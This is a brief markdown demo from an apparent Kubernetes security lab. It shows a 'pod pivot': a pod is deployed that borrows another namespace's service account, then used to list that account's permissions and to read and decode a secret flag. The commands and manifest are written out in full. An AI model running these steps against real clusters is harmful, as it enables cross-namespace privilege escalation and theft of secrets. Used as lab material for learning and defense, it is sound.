# Demo: Pod Pivot

Technique 2: create pod with service account of another namespace to access its resources.

![Pod pivot demo](gifs/02-pod-pivot.gif)

## Commands run

```bash
kubectl get serviceaccounts -n wallet-svc
cat manifests/pod-pivot.yaml
kubectl apply -f manifests/pod-pivot.yaml
kubectl get pod pod-pivot -n wallet-svc
kubectl exec -it -n wallet-svc pod-pivot -- sh

# inside the pod, as ledger-reader
kubectl auth can-i --list -n ledger-svc
kubectl get secrets -n ledger-svc
kubectl get secret demo-flag-2 -n ledger-svc -o jsonpath='{.data.flag}' | base64 -d
exit
```

## manifests/pod-pivot.yaml

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-pivot
  namespace: wallet-svc
spec:
  serviceAccountName: ledger-reader
  containers:
    - name: kubectl
      image: docker.io/alpine/kubectl:latest
      command: ["sleep", "3600"]
      securityContext:
        allowPrivilegeEscalation: false
        runAsNonRoot: true
        runAsUser: 1000
        seccompProfile:
          type: RuntimeDefault
        capabilities:
          drop: ["ALL"]
  securityContext:
    runAsNonRoot: true
```
